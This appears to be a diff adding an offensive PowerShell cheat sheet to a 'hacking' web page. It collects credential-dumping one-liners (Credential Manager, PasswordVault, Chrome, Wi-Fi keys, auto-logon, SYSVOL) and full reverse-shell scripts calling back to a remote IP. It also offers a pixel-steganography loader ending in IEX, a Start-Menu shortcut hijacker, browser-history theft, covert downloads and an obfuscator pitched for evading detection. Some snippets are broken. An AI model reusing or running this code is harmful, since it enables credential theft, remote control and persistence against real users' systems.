+With this command we can locate files containing a certain pattern, e.g. here were are looking for a “password” pattern in various textual configuration files:
+
+gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+Although this can produce a lot of noise, it could also yield some interesting results as well.
+
+Recommended to do this for every disk drive.
+
+Find database credentials in configuration files
+Using the following PowerShell command we can find database connection strings (with plaintext credentials) stored in various configuration files such as web.config for ASP.NET configuration, in Visual Studio project files etc.:
+
+gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"
+Finding connection strings e.g. for a remote Microsoft SQL Server could lead to a Remote Command Execution (RCE) using the xp_cmdshell functionality (link, link, link etc.) and consequent lateral movement.
+
+Locate web server configuration files
+With this command, we can easily find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:
+
+gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue
+
+Get stored passwords from Windows PasswordVault
+Using the following PowerShell command we can extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications:
+
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
+
+Get stored passwords from Windows Credential Manager
+Windows Credential Manager provides another mechanism of storing credentials for signing in to websites, logging to remote systems and various applications and it also provides a secure way of using credentials in PowerShell scripts.
+
+With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:
+
+Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }
+
+
+Dump passwords from Google Chrome browser
+The following command extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:
+
+[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+Similarly, this has to be executed under the context of the target (victim) user.
+
+Get stored Wi-Fi passwords from Wireless Profiles
+With this command we can extract all stored Wi-Fi passwords (WEP, WPA PSK, WPA2 PSK etc.) from the wireless profiles that are configured in the Windows system:
+
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+
+Search registry for auto-logon credentials
+Windows systems can be configured to auto login upon boot, which is for example used on POS (point of sale) systems. Typically, this is configured by storing the username and password in a specific Winlogon registry location, in clear text.
+
+The following command will get the auto-login credentials from the registry:
+
+gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
+
+Credentials in SYSVOL and Group Policy Preferences (GPP)
+In corporate Windows Active Directory environments, credentials can be sometimes found stored in the Group Policies, in various custom scripts or configuration files on the domain controllers in the SYSVOL network shares.
+
+Since the SYSVOL network shares are accessible to any authenticated domain user, we can easily identify if there are any stored credentials using the following command:
+
+Push-Location \\\\example.com\sysvol
+gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password
+Pop-Location
+
+</code>
+
+        </div>
+    </section>
+<section>
+<h2>Payloads for LOL Powershell</h2>
+<code>
+Reverse Shell -> Initiates a connection back to a remote system, allowing the remote party to execute commands on the target
+
+
+Initial Access, Persistance, Post-Exploitation, Data Exfil, C2
+Encrypt/Decrypt strings in AES
+
+$client = New-Object System.Net.Sockets.TCPClient("1.1.1.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+$TCPClient = New-Object Net.Sockets.TCPClient("1.1.1.1", 8080);
+$NetworkStream = $TCPClient.GetStream();
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
+[byte[]]$Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
+function WriteToStream ($String) {
+    $StreamWriter.Write($String + 'SHELL> ');
+    $StreamWriter.Flush()
+}
+WriteToStream '';
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
+    $Output = try {
+        Invoke-Expression $Command 2>&1 | Out-String
+    } catch {
+        $_ | Out-String
+    }
+    WriteToStream ($Output)
+}
+$StreamWriter.Close();
+$TCPClient.Close();
+
+
+Get-DefenderExclusions
+Find what paths are on Windows Defender's Exclusion list. Files stored here will be ignored by the Anti Virus
+
+$exclusions = Get-DefenderExclusions
+      
+function Get-DefenderExclusions {
+    param (
+        [string]$LogName = "Microsoft-Windows-Windows Defender/Operational",
+        [int]$EventID = 5007
+    )
+    # Get all event logs with the specified Event ID
+    $events = Get-WinEvent -LogName $LogName | Where-Object { $_.Id -eq $EventID }
+    # Filter events that contain the word "Exclusions"
+    $exclusionEvents = $events | Where-Object { $_.Message -match "Exclusions" }
+    # Define patterns for custom paths, extensions, and processes
+    $patternPaths = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\.*"
+    $patternExtensions = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\.*"
+    $patternProcesses = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\\.*"
+    # Extract and parse all types of exclusions from the message
+    $exclusionEvents | ForEach-Object {
+        $message = $_.Message
+        if ($message -match $patternPaths) {
+            [PSCustomObject]@{
+                TimeCreated   = $_.TimeCreated
+                ExclusionType = 'Path'
+                ExclusionValue = $matches[0]
+            }
+        }
+        if ($message -match $patternExtensions) {
+            [PSCustomObject]@{
+                TimeCreated   = $_.TimeCreated
+                ExclusionType = 'Extension'
+                ExclusionValue = $matches[0]
+            }
+        }
+        if ($message -match $patternProcesses) {
+            [PSCustomObject]@{
+                TimeCreated   = $_.TimeCreated
+                ExclusionType = 'Process'
+                ExclusionValue = $matches[0]
+            }
+        }
+    }
+}
+
+
+
+Store a Powershell script in the pixels of an image
+
+# Provide Script to hide. Image to use. Where to save modified image. Path where picture is intended to be dropped off at and executed from.
+Invoke-PixelScript -Script "\Desktop\calc.ps1" -Image "\Desktop\notSecret.png" -Out "$env:userprofile\downloads\out.png" -ExecPath "$env:userprofile\downloads\out.png"
+
+
+
+function Invoke-PixelScript {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String] $Script,
+        [Parameter(Position = 1, Mandatory = $true)]
+        [String] $Out,
+        [Parameter(Position = 2, Mandatory = $false)]
+        [String] $Image,
+        [Parameter(Position = 3, Mandatory = $false)]
+        [String] $ExecPath = $Out
+    )
+    # Stop if we hit an error instead of making more errors
+    $ErrorActionPreference = "Stop"
+    # Load necessary .NET assemblies
+    Add-Type -AssemblyName System.Drawing
+    # Ensure paths are absolute
+    $Script = Resolve-Path $Script
+    if ($Image) {
+        $Image = Resolve-Path $Image
+    }
+    # Read in the script
+    $ScriptContent = [IO.File]::ReadAllText($Script)
+    $payload = [System.Text.Encoding]::ASCII.GetBytes($ScriptContent)
+    if ($Image) {
+        $img = New-Object System.Drawing.Bitmap $Image
+    } else {
+        # Calculate necessary image size (simple square calculation for easy understanding)
+        $sideLength = [Math]::Ceiling([Math]::Sqrt($payload.Length / 3)) * 3
+        $img = New-Object System.Drawing.Bitmap $sideLength, $sideLength
+    }
+    $width = $img.Width
+    $height = $img.Height
+    # Process each pixel to embed the script payload
+    for ($y = 0; $y -lt $height; $y++) {
+        for ($x = 0; $x -lt $width; $x++) {
+            $index = $y * $width + $x
+            if ($index -lt $payload.Length) {
+                $byteValue = $payload[$index]
+                $color = $img.GetPixel($x, $y)
+                $newR = ($color.R -band 0xF0) -bor ($byteValue -shr 4)
+                $newG = ($color.G -band 0xF0) -bor ($byteValue -band 0x0F)
+                $newColor = [System.Drawing.Color]::FromArgb($newR, $newG, $color.B)
+                $img.SetPixel($x, $y, $newColor)
+            }
+        }
+    }
+    # Save the image as PNG
+    $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
+    $img.Dispose()
+	# Generate the execution one-liner
+	$pscmd = @"
+	sal a New-Object;Add-Type -A System.Drawing;
+	`$g=a System.Drawing.Bitmap(`"$ExecPath`");
+	`$o=a Byte[] $($width*$height);
+	(0..$($height-1))|%{
+		foreach(`$x in 0..$($width-1)) {
+			`$p=`$g.GetPixel(`$x, `$_);
+			`$o[`$_*$width+`$x]=[math]::Floor((`$p.R -band 0x0F)*16) + (`$p.G -band 0x0F);
+		}
+	};
+	`$g.Dispose();
+	IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$($payload.Length-1)]))
+	"@
+	return $pscmd
+}
+
+
+Retrieves wifi profile names and passwords
+$credentials = Get-WifiCredentials
+
+
+function Get-WifiCredentials {
+    (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object {
+        $profile = ($_ -split ': ')[1].Trim()
+        $password = (netsh wlan show profile name="$profile" key=clear) -match 'Key Content' |
+            ForEach-Object {
+                ($_ -split ': ')[1].Trim()
+            }
+        [PSCustomObject]@{
+            ProfileName = $profile
+            Password    = if ($password) { $password } else { 'N/A' }
+        }
+    }
+}
+
+
+
+Retrieves GeoLocation of PC
+$Lat, $Lon = Get-GeoLocation
+
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GL = $GL -split " "
+		$Lat = $GL[0].Substring(11) -replace ".$"
+		$Lon = $GL[1].Substring(10) -replace ".$" 
+		return $Lat, $Lon
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+}
+
+Hijack Shortcuts
+This function, Invoke-ShortcutHijack, is designed to modify specified shortcut (.lnk) files by altering their target paths to point to a designated PowerShell executable (hardcoded to "powershell.exe" in the current version). It works by locating shortcut files—either through direct file path input or by searching default directories such as the Start Menu—and then loading each as a COM object
+
+# Example 1: Hijack shortcuts found in the default Start Menu
+# Uses the default payload which loads necessary GUI assemblies and shows a message box "Hacked"
+Invoke-ShortcutHijack
+# Example 2: Hijack specific shortcuts (by full file paths)
+Invoke-ShortcutHijack -ShortcutPaths "C:\Users\Alice\Desktop\example.lnk", "C:\Users\Alice\Desktop\other.lnk" -PayloadCode "Write-Host 'Payload activated'"
+# Example 3: Search a specified directory for shortcuts to hijack, using a custom payload
+Invoke-ShortcutHijack -SearchDirectory "C:\temp" -PayloadCode "Write-Host 'Custom payload executed'"
+# Example 4: Hijack a specific shortcut with a custom payload
+Invoke-ShortcutHijack -ShortcutPaths "C:\Users\Alice\Desktop\test.lnk" -PayloadCode "Write-Host 'Payload activated'"
+
+function Invoke-ShortcutHijack {
+    [CmdletBinding()]
+    Param(
+        # Optional: Provide one or more full paths to shortcut (.lnk) files to hijack.
+        [Parameter(Mandatory=$false)]
+        [string[]]$ShortcutPaths,
+        # Optional: If no specific shortcuts are provided, search this directory (and subdirectories) for .lnk files.
+        [Parameter(Mandatory=$false)]
+        [string]$SearchDirectory,
+        # The payload code to inject into the shortcut. Defaults to a message box.
+        [Parameter(Mandatory=$false)]
+        [string]$PayloadCode = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"
+    )
+    # Create the COM object needed to interact with shortcuts.
+    $shell = New-Object -ComObject WScript.Shell
+    # Determine the list of shortcut files.
+    if ($ShortcutPaths -and $ShortcutPaths.Count -gt 0) {
+        $shortcutFiles = foreach ($sp in $ShortcutPaths) {
+            if (Test-Path $sp) { Get-Item $sp }
+            else { Write-Warning "Shortcut not found: $sp" }
+        }
+    }
+    elseif ($SearchDirectory) {
+        $shortcutFiles = Get-ChildItem -Path $SearchDirectory -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
+    }
+    else {
+        # Default to searching common Start Menu directories.
+        $userStartMenu = [System.Environment]::GetFolderPath('StartMenu')
+        $commonStartMenu = $shell.SpecialFolders.Item('AllUsersStartMenu')
+        $shortcutFiles = Get-ChildItem -Path $userStartMenu, $commonStartMenu -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
+    }
+    if (-not $shortcutFiles) {
+        Write-Host "No shortcut files found."
+        return
+    }
+    # Always use powershell.exe as the target shell.
+    $targetShell = "powershell.exe"
+    foreach ($file in $shortcutFiles) {
+        try {
+            # Create a shortcut object from the file.
+            $link = $shell.CreateShortcut($file.FullName)
+            $originalTarget = $link.TargetPath
+            # Adjust IconLocation if it's empty or too short.
+            $iconLocation = $link.IconLocation
+            if ([string]::IsNullOrEmpty($iconLocation) -or $iconLocation.Length -lt 4) {
+                $iconLocation = "$originalTarget"
+            }
+            # Build new arguments to launch the original target then execute the payload.
+            # Note: We're using -ExecutionPolicy Bypass and the -Command parameter.
+            $newArgs = "-w h -ExecutionPolicy Bypass -Command `"Start-Process '$originalTarget'; $PayloadCode`""
+            # Update the shortcut properties.
+            $link.Arguments = $newArgs
+            $link.TargetPath = $targetShell
+            $link.IconLocation = $iconLocation
+            # Save the changes.
+            $link.Save()
+            Write-Host "Hijacked shortcut: $($file.FullName)"
+        }
+        catch {
+            Write-Warning "Failed to hijack shortcut: $($file.FullName). Error: $_"
+        }
+    }
+}
+
+Set Cracked Wallpaper
+Set-CrackedDesktopWallpaper -CrackedImageUrl "https://powershellforhackers.com/assets/cracked.png"
+
+
+function Set-CrackedDesktopWallpaper {
+    param(
+        [string]$CrackedImageUrl
+    )
+    # Load the System.Drawing assembly
+    Add-Type -AssemblyName System.Drawing
+    # Get the current wallpaper path
+    $currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper).Wallpaper
+    # Extract the file extension from the current wallpaper
+    $extension = [System.IO.Path]::GetExtension($currentWallpaper)
+    # Define paths for the images and output using the same extension
+    $wallpaperPath = "$env:USERPROFILE\Downloads\wallpaper_original$extension"
+    $overlayPath   = "$env:USERPROFILE\Downloads\crackedscreenoverlay.png"
+    $outputPath    = "$env:USERPROFILE\Downloads\yourcrackedwallpaper$extension"
+    # Copy current wallpaper to the Downloads folder
+    Copy-Item $currentWallpaper -Destination $wallpaperPath
+    # Download the cracked screen overlay image
+    Invoke-WebRequest -Uri $CrackedImageUrl -OutFile $overlayPath
+    # Load the images
+    $wallpaper = [System.Drawing.Image]::FromFile($wallpaperPath)
+    $overlay   = [System.Drawing.Image]::FromFile($overlayPath)
+    # Create a new bitmap with the same dimensions as the wallpaper
+    $bitmap = New-Object System.Drawing.Bitmap $wallpaper.Width, $wallpaper.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    # Draw the original wallpaper and the overlay
+    $graphics.DrawImage($wallpaper, 0, 0, $wallpaper.Width, $wallpaper.Height)
+    $graphics.DrawImage($overlay, 0, 0, $wallpaper.Width, $wallpaper.Height)
+    # Save the combined image as a new file using the same extension
+    $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)  # This saves as PNG but maintains the original extension in the file name.
+    # Clean up resources
+    $graphics.Dispose()
+    $wallpaper.Dispose()
+    $overlay.Dispose()
+    $bitmap.Dispose()
+    # Set the new image as the desktop wallpaper using user32.dll
+    $signature = @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Wallpaper {
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    }
+"@
+    Add-Type $signature
+    $SPI_SETDESKWALLPAPER = 20
+    $SPIF_UPDATEINIFILE = 1
+    $SPIF_SENDWININICHANGE = 2
+    [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE)
+}
+
+
+Hide Zip in Png
+Embeds the contents of a specified file (e.g., a ZIP) into the last IDAT chunk of a PNG, producing a valid PNG that also contains a hidden Zip file. Just change the ext to '.zip'.
+
+Must open .zip after with WinRAR specifically
+
+
+Embed-ZipInPNG -CoverPNG "coverImage.png" -ContentFile "secret.zip" -OutputPNG "secretZip.png"
+
+function Embed-ZipInPNG {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$CoverPNG,
+        [Parameter(Mandatory=$true)]
+        [string]$ContentFile,
+        [Parameter(Mandatory=$true)]
+        [string]$OutputPNG
+    )
+    Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Text;
+using System.Collections.Generic;
+public static class PngEmbedder
+{
+    private static readonly byte[] PngMagic = new byte[] {
+        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
+    };
+    // CRC32 helper class
+    private static class Crc32
+    {
+        private static readonly uint[] Table = new uint[256];
+        static Crc32()
+        {
+            const uint poly = 0xedb88320u;
+            for (uint i = 0; i < 256; i++)
+            {
+                uint temp = i;
+                for (int j = 0; j < 8; j++)
+                {
+                    if ((temp & 1) == 1)
+                        temp = (temp >> 1) ^ poly;
+                    else
+                        temp >>= 1;
+                }
+                Table[i] = temp;
+            }
+        }
+        public static uint Compute(byte[] data)
+        {
+            uint crc = 0xffffffff;
+            foreach (byte b in data)
+            {
+                crc = (crc >> 8) ^ Table[(crc ^ b) & 0xff];
+            }
+            return ~crc;
+        }
+        public static uint Compute(byte[] data, int offset, int length)
+        {
+            uint crc = 0xffffffff;
+            for (int i = offset; i < offset + length; i++)
+            {
+                crc = (crc >> 8) ^ Table[(crc ^ data[i]) & 0xff];
+            }
+            return ~crc;
+        }
+    }
+    // Read an int (4 bytes) big-endian
+    private static int ReadIntBigEndian(byte[] data, int offset)
+    {
+        // big-endian: data[offset] is the high byte
+        return (data[offset]   << 24) |
+               (data[offset+1] << 16) |
+               (data[offset+2] <<  8) |
+               (data[offset+3]      );
+    }
+    // Write an int (4 bytes) big-endian into arr
+    private static void WriteIntBigEndian(byte[] arr, int offset, int value)
+    {
+        arr[offset]   = (byte)((value >> 24) & 0xFF);
+        arr[offset+1] = (byte)((value >> 16) & 0xFF);
+        arr[offset+2] = (byte)((value >>  8) & 0xFF);
+        arr[offset+3] = (byte)( value        & 0xFF);
+    }
+    // We'll only modify the LAST IDAT we find. This helps preserve the original image data up to that point.
+    public static void EmbedInLastIdat(string coverPath, string contentPath, string outputPath)
+    {
+        byte[] coverBytes = File.ReadAllBytes(coverPath);
+        byte[] contentBytes = File.ReadAllBytes(contentPath);
+        // Verify PNG magic
+        for (int i=0; i<PngMagic.Length; i++)
+        {
+            if (coverBytes[i] != PngMagic[i])
+                throw new Exception("Not a valid PNG file (bad magic).");
+        }
+        // We'll parse all chunks, store them in a list, and only modify the last IDAT chunk.
+        List<(int Length, string Type, byte[] Data, byte[] Crc)> chunks = new List<(int, string, byte[], byte[])>();
+        int pos = PngMagic.Length;
+        while (pos + 8 <= coverBytes.Length)
+        {
+            // read chunk length
+            int chunkLen = ReadIntBigEndian(coverBytes, pos);
+            pos += 4;
+            if (pos + 4 > coverBytes.Length) break;
+            // read chunk type
+            byte[] typeBytes = new byte[4];
+            Buffer.BlockCopy(coverBytes, pos, typeBytes, 0, 4);
+            pos += 4;
+            string chunkStr = Encoding.ASCII.GetString(typeBytes);
+            // read chunk data
+            if (pos + chunkLen > coverBytes.Length) break;
+            byte[] chunkData = new byte[chunkLen];
+            Buffer.BlockCopy(coverBytes, pos, chunkData, 0, chunkLen);
+            pos += chunkLen;
+            // read chunk CRC
+            if (pos + 4 > coverBytes.Length) break;
+            byte[] crc = new byte[4];
+            Buffer.BlockCopy(coverBytes, pos, crc, 0, 4);
+            pos += 4;
+            chunks.Add((chunkLen, chunkStr, chunkData, crc));
+            if (chunkStr == "IEND") break;
+        }
+        // find the last IDAT
+        int lastIdatIndex = -1;
+        for (int i=0; i<chunks.Count; i++)
+        {
+            if (chunks[i].Type == "IDAT")
+                lastIdatIndex = i;
+        }
+        if (lastIdatIndex < 0)
+        {
+            // no IDAT at all?
+            throw new Exception("No IDAT chunk found in this PNG!");
+        }
+        // We'll embed content in the last IDAT chunk
+        var (length, idatType, idatData, idatCrc) = chunks[lastIdatIndex];
+        // Merge content at the end
+        byte[] newIdatData = new byte[idatData.Length + contentBytes.Length];
+        Buffer.BlockCopy(idatData, 0, newIdatData, 0, idatData.Length);
+        Buffer.BlockCopy(contentBytes, 0, newIdatData, idatData.Length, contentBytes.Length);
+        // Recompute length
+        int newLen = newIdatData.Length;
+        // Recompute CRC
+        // The chunk CRC is computed over (Type + Data).
+        byte[] typePlusData = new byte[4 + newLen];
+        Encoding.ASCII.GetBytes(idatType, 0, 4, typePlusData, 0);
+        Buffer.BlockCopy(newIdatData, 0, typePlusData, 4, newLen);
+        uint newCrcVal = Crc32.Compute(typePlusData);
+        byte[] newCrc = new byte[4];
+        WriteIntBigEndian(newCrc, 0, (int)newCrcVal);
+        // Update the chunk in our list
+        chunks[lastIdatIndex] = (newLen, idatType, newIdatData, newCrc);
+        // Now write everything out
+        using (var ms = new MemoryStream())
+        using (var bw = new BinaryWriter(ms))
+        {
+            // PNG header
+            bw.Write(PngMagic, 0, PngMagic.Length);
+            foreach (var (len, ctype, cdata, ccrc) in chunks)
+            {
+                // write length big-endian
+                byte[] lenBytes = new byte[4];
+                WriteIntBigEndian(lenBytes, 0, len);
+                bw.Write(lenBytes);
+                // write type
+                bw.Write(Encoding.ASCII.GetBytes(ctype));
+                // write data
+                bw.Write(cdata);
+                // write crc
+                bw.Write(ccrc);
+                if (ctype == "IEND") break;
+            }
+            File.WriteAllBytes(outputPath, ms.ToArray());
+        }
+    }
+}
+"@
+    # Now invoke the static method
+    [PngEmbedder]::EmbedInLastIdat($CoverPNG, $ContentFile, $OutputPNG)
+    Write-Host "Embed complete. Wrote $OutputPNG"
+}
+
+
+
+Get Browser Data
+
+Retrieves history and bookmarks from browsers
+
+# 1) Get Chrome History
+Get-BrowserData -Browser chrome -DataType history
+# 2) Get Edge Bookmarks
+Get-BrowserData -Browser edge -DataType bookmarks
+# 3) Attempt naive Firefox history extraction
+Get-BrowserData -Browser firefox -DataType history
+# 4) Provide a search pattern (e.g., only match "facebook")
+Get-BrowserData -Browser chrome -DataType history -Search "facebook"
+
+
+
+function Get-BrowserData {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('chrome','edge','firefox')]
+        [string]$Browser,
+        [Parameter(Mandatory)]
+        [ValidateSet('history','bookmarks')]
+        [string]$DataType,
+        # Optional pattern if you only want to match certain URLs
+        [string]$Search = '.'
+    )
+    # Regex to find URLs in raw text
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+    # Identify the path for each browser/type combination
+    switch ("$Browser`_$DataType") {
+        'chrome_history' {
+            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+        }
+        'chrome_bookmarks' {
+            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+        }
+        'edge_history' {
+            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        }
+        'edge_bookmarks' {
+            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+        }
+        'firefox_history' {
+            # STILL naive, might catch some ASCII references in places.sqlite
+            $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+        }
+        'firefox_bookmarks' {
+            Write-Warning "Firefox bookmarks are not supported with this naive regex approach."
+            return
+        }
+        default {
+            Write-Warning "Invalid combination: $Browser $DataType"
+            return
+        }
+    }
+    # Ensure the file exists
+    if (-not (Test-Path $Path)) {
+        Write-Warning "File not found: $Path"
+        return
+    }
+    # Read and regex-match
+    Get-Content -Path $Path -ErrorAction SilentlyContinue |
+        Select-String -AllMatches $Regex |
+        ForEach-Object { $_.Matches.Value } |
+        Sort-Object -Unique |
+        Where-Object { $_ -match $Search } |
+        ForEach-Object {
+            [PSCustomObject]@{
+                User     = $env:UserName
+                Browser  = $Browser
+                DataType = $DataType
+                URL      = $_
+            }
+        }
+}
+
+
+Deletes all temporary files in the system temp folder.
+
+Remove-Item -Path $env:TEMP\* -Recurse -Force
+
+
+
+Flashes the Caps Lock LED on the keyboard 10 times.
+$wshell = New-Object -ComObject WScript.Shell
+1..10 | ForEach-Object { $wshell.SendKeys("{CAPSLOCK}") ; Start-Sleep -Milliseconds 200 }
+
+Locks the workstation immediately.
+rundll32.exe user32.dll,LockWorkStation
+
+
+
+Checks if the current PowerShell session is running as an administrator.
+[System.Security.Principal.WindowsPrincipal]::new(
+    [System.Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+
+
+Searches for files containing the word 'password' in user directories.
+
+Select-String -Path C:\Users\*.* -Pattern "password" -CaseSensitive -Recurse
+
+Easy way to check if a string is base64 encoded.
+$B64   = "cwB0AGEAcgB0ACAAYwBhAGwAYwA=" # start calc
+$isB64 = try{$null=[Convert]::FromBase64String($B64);$true}catch{$false}
+$isB64
+
+
+
+Download File Explore different PowerShell methods for downloading files covertly
+Invoke-WebRequest -Uri "" -OutFile "downloaded-file"  #Fileless execution
+ex.
+Invoke-WebRequest -Uri "Invoke-WebRequest -Uri "example.com" -OutFile "example.png"" -OutFile "downloaded-file"
+
+Invoke-RestMethod -Uri "" -OutFile "downloaded-file"
+
+
+$client = New-Object System.Net.WebClient; $client.DownloadFile("", "downloaded-file")
+
+
+Start-BitsTransfer -Source "" -Destination "downloaded-file"
+
+$client = [System.Net.Http.HttpClient]::new(); $response = $client.GetAsync("").Result; $response.Content.ReadAsStringAsync().Result | Out-File "downloaded-file"
+
+
+$webRequest = [System.Net.WebRequest]::Create(""); $webResponse = $webRequest.GetResponse(); $stream = $webResponse.GetResponseStream(); $reader = [System.IO.StreamReader]::new($stream); $content = $reader.ReadToEnd(); $reader.Close(); $content | Out-File "downloaded-file"
+
+</code>
+
+</section>
+
+
+
+
+
+
+
+    <section class="obfuscator">
+        <h2>PowerShell Code Obfuscation Generator</h2>
+        <p>Obfuscating PowerShell code can be helpful for evading detection. Below is a simple generator that you can use to obfuscate your PowerShell code.</p>
+
+        <label for="inputCode">Enter your PowerShell code:</label><br>
+        <textarea id="inputCode" rows="10" cols="50"></textarea><br><br>
+        
+        <button onclick="obfuscateCode()">Obfuscate Code</button><br><br>
+
+        <label for="outputCode">Obfuscated Code:</label><br>
+        <textarea id="outputCode" rows="10" cols="50" readonly></textarea>
+        
+        <script>
+            function obfuscateCode() {
+                var inputCode = document.getElementById("inputCode").value;
+                var obfuscatedCode = "Obfuscated code: " + inputCode.split('').reverse().join('');
+                document.getElementById("outputCode").value = obfuscatedCode;
+            }
+        </script>
+    </section>
+
+    <section>
+        <h2>Additional PowerShell Resources</h2>
+        <p>If you're looking to dive deeper into PowerShell for ethical hacking, here are some useful resources:</p>
+        <ul>
+            <li><a href="https://docs.microsoft.com/en-us/powershell/">PowerShell Documentation</a></li>
+            <li><a href="https://github.com/EmpireProject/Empire">Empire: PowerShell and Python Post-Exploitation Framework</a></li>
+            <li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Pentesters-Guide-to-PowerShell-Scripting-WP.pdf">Pentester's Guide to PowerShell Scripting (Black Hat)</a></li>
+            <li><a href="https://book.hacktricks.xyz/windows-hardening/powershell-recon-and-attack">HackTricks: PowerShell Recon and Attack</a></li>
+        </ul>
+    </section>
+
+</body>
+</html>
